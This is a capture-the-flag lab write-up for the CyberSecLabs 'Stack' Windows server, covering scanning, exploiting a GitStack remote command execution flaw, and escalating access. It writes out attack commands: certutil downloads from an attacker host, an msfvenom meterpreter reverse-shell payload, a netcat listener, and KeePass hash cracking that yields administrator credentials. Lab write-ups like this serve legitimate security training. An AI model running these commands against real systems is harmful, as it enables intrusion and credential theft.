---
description: https://www.cyberseclabs.co.uk/labs/info/Stack/
---

# Stack

## Scanning and Enumeration

### Nmap

Running an initial Nmap scan with the `-A` switch produces the following.

```
sudo nmap 172.31.1.12 -p-  -A                                                                                                                                                                                              
                                                                                                                                                                                                             
PORT      STATE SERVICE            VERSION                                                                                                                                                                                                 
135/tcp   open  msrpc              Microsoft Windows RPC                                                                                                                                                                                   
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn                                                                                                                                                                           
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds                                                                                                                                                    
3389/tcp  open  ssl/ms-wbt-server?                                                                                                                                                                                                         
| rdp-ntlm-info:                                                                                                                                                                                                                           
|   Target_Name: STACK                                                                                                                                                                                                                     
|   NetBIOS_Domain_Name: STACK
|   NetBIOS_Computer_Name: STACK
|   DNS_Domain_Name: Stack
|   DNS_Computer_Name: Stack
|   Product_Version: 6.3.9600
|_  System_Time: 2020-12-09T10:05:50+00:00
| ssl-cert: Subject: commonName=Stack
| Not valid before: 2020-12-08T09:56:41
|_Not valid after:  2021-06-09T09:56:41
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
```

### Port 445 (SMB)

First up we can check against SMB with null authentication. I was unable to authenticate unfortunately with various tools.

![](<../../../.gitbook/assets/image (464) (1).png>)

Enum4linux also aborted due to null authentication errors.

![](<../../../.gitbook/assets/image (465) (1).png>)

### Port 80 (HTTP)

Port is open so we can start with `Gobuster` and `Nikto` to see what information we can initially pull before physically browsing to the webpage.

The root page takes us to the following when browsing to [http://172.31.1.12](http://172.31.1.2) in a web browser.

![](<../../../.gitbook/assets/image (467).png>)

The Firefox extension 'Wappalyzer' confirms the following information regarding the webpage.

![](<../../../.gitbook/assets/image (466) (1).png>)

### Dirb

I did not get results from `Gobuster` so decided to use a recursive directory enumeration tool. On finding the /web/ directory `dirb` then found /web/index.php.

![](<../../../.gitbook/assets/image (469).png>)

After browsing to the directory we come to the following page.

![](<../../../.gitbook/assets/image (470).png>)

## Exploitation

After searching around this I found nothing of interest and dead ends.. We do have a name in the tab of 'GitStack Web'.

After searching on Google we come to the following hosted on exploit-db.com

{% embed url="https://www.exploit-db.com/exploits/44044" %}

This is a python script in which all we need to do is change the IP and the command we want to execute. This should hopefully give us remote command execution on the server.

![](<../../../.gitbook/assets/image (471).png>)

We can run the script and confirm remote code execution with the `ipconfig` command.

![](<../../../.gitbook/assets/image (472).png>)

### Reverse Shell as user

We should now attempt to gain a proper reverse shell so we can enumerate the server properly.

I started off by opening a `Python SimpleHttpServer` in a directory that hosts `nc.exe`.

```
sudo python2 -m SimpleHTTPServer 80
```

Then I edited the exploit to download the `nc.exe` file from my attacking machine.

![](<../../../.gitbook/assets/image (473).png>)

![](<../../../.gitbook/assets/image (474) (1).png>)

I then created a `netcat` listener on my attacking machine in preparation for the next step.

```
nc -lvp 4444
```

Now we can edit the command in the exploit to call the `nc.exe` we uploaded back to the listener running on our attacking machine.

![](<../../../.gitbook/assets/image (475) (1).png>)

After executing the exploit we manage to get a reverse shell and confirm the user we are running as.

![](<../../../.gitbook/assets/image (476).png>)

### Privilege Escalation

I then downloaded `winPEAS.exe` with `certutil.exe` from my attacking machine.

```
certutil.exe -f -urlcache split http://<IP>/winpeas.exe
```

After running we can see that we have the 'SeImpersonatePrvilege' set.

![](<../../../.gitbook/assets/image (477).png>)

I then ran the `systeminfo` command on the system to check OS version.

![](<../../../.gitbook/assets/image (478).png>)

As we are running Windows Server 2012 R2 Standard and have the SeImpersonatePrivilege we can more than likely run a juicy / rotten potato attack to escalate our privileges.

I ran the `systeminfo` command information against Windows-exploit-suggester.py which has reinforced for us that we can likely perform this type of attack for privilege escalation.

![](<../../../.gitbook/assets/image (479).png>)

I previously covered a JuicyPotato attack on my writeup for HackTheBoxe's Bart. This was covered without `metasploit` so I will take this opportunity to include the attack with `metasploit` in a writeup.

First I created a payload for meterpreter with `msfvenom`.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.0.173 LPORT=4455 -f exe -o /home/kali/scripts/windows/metshell.exe
```

I then downloaded the payload on to the machine with `certutil.exe`

![](<../../../.gitbook/assets/image (481).png>)

I then run the module `exploit/multi/handler` on Metasploit and set the correct information and set the payload to be the exact same as the one specified in the msfvenom command. I then run the Metasploit module and once the listener was set up and running I then executed the uploaded payload on the server.

![](<../../../.gitbook/assets/image (482).png>)

I tried multiple times to get the Metasploit module working for JuicyPotato and could not get a valid CLSID to perform the escalation with[.](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows\_Server\_2012\_Datacenter)

[CLSID list](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows\_Server\_2012\_Datacenter)

![](<../../../.gitbook/assets/image (483).png>)

At this point It could take a while to find the correct CLSID to use against this server. I want to explore more attack vectors first.

One of the interesting bits of information I found earlier was a file called 'password\_manager.kdbx'.

![](<../../../.gitbook/assets/image (485).png>)

After performing a Google search the file extension belongs to KeePass which is a password manager. The file appears to be a database file.

After searching for exploits with the KeePass database file I found some blogposts where we can convert the KeePass database file into a hash with a John the Ripeepr module called KeePass2John which we can then attempt to crack.

Since we are already in a meterpreter shell we can just run the `download` command with the path of the KeePass database to download.

![](<../../../.gitbook/assets/image (486).png>)

We can then run the keepass2john command on Kali to convert the file to a hash format.

```
keepass2john password_manager.kdbx > /home/kali/Desktop/keepassdatabase.hash
```

We can then check John for available formats.

![](<../../../.gitbook/assets/image (487).png>)

We can then run John against the has with the `--format=KeePass` switch.

```
sudo john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/keepassdatabase.hash 
```

![](<../../../.gitbook/assets/image (488).png>)

Now that John has cracked the password of 'princess' we can now install KeePass2 and see if we can open the database file with the password we have cracked.

```
sudo apt-get install KeePass2
```

Once downloaded open Keepass2 and load the database file. You will then be presented with a credentials screen to open the database.

![](<../../../.gitbook/assets/image (489).png>)

We can then open the Administrators profile and view the stored password.

![](<../../../.gitbook/assets/image (490).png>)

John's password:

![](<../../../.gitbook/assets/image (491).png>)

We now have credentials to the following:

* Administrator:secur3\_apass262
* John:whLd49NnsDWRJ7KW

I actually tried cracking the NTLMv2 hash for the John account much earlier on before I noticed a KeePass file on the system. I captured it by setting up a SMB server on my attacking machine and getting the user account to authenticate against it. Makes sense I could not crack it when the password is that strong.

Since RDP is open I connected as the Administrator account and was successful.

![](<../../../.gitbook/assets/image (494) (1).png>)

We can also log in with Evil-WinRM as port 5985 is open.

![](<../../../.gitbook/assets/image (495).png>)
